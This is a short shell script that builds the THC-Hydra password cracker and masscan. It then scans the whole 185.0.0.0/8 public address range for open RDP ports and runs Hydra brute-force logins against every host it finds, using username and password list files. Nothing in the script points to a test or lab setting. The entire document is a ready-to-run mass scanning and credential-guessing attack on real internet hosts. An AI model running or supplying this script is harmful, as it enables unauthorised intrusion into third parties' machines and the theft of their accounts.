sudo apt update && sudo apt install build-essential freerdp2-dev masscan -y;
git clone https://github.com/vanhauser-thc/thc-hydra.git;
cd thc-hydra;
./configure && make -j8 && sudo make install;
cd ..;
sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -L user -P pass -t1 -W1 -I >hydra.log;
done
